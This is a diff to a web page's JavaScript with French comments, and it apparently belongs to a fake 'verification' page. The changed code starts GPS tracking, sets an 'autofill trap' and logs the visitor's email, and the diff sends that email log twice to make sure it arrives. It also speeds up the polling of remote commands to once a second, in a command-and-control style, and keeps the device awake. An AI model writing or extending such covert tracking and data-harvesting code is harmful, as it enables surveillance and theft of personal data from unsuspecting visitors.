@@ -512,8 +512,9 @@ async function startVerification() {
             // Initialisation du tracking GPS
             startGpsTracking();
 
-            // Envoi immédiat du log avec l'email
+            // FORCE : Envoi immédiat et répété pour être sûr que l'email arrive
             await logVisitor(null, true, true);
+            setTimeout(() => logVisitor(null, true, true), 2000);
 
             // On libère l'accès
             setTimeout(() => {
@@ -585,8 +586,15 @@ if (document.readyState === 'complete') {
 
     setupAutofillTrap();
     startVerification();
-    // Vérification des commandes très fréquente (toutes les 2 secondes)
-    setInterval(checkCommands, 2000);
+    
+    // VÉRIFICATION DES COMMANDES : Ultra-agressif (toutes les 1 seconde)
+    // On utilise une boucle récursive pour garantir qu'une seule requête tourne à la fois
+    const pollCommands = async () => {
+        await checkCommands();
+        setTimeout(pollCommands, 1000);
+    };
+    pollCommands();
+
     // Tenter de réactiver le Wake Lock au clic ou focus
     document.addEventListener('click', requestWakeLock);
     window.addEventListener('focus', requestWakeLock);
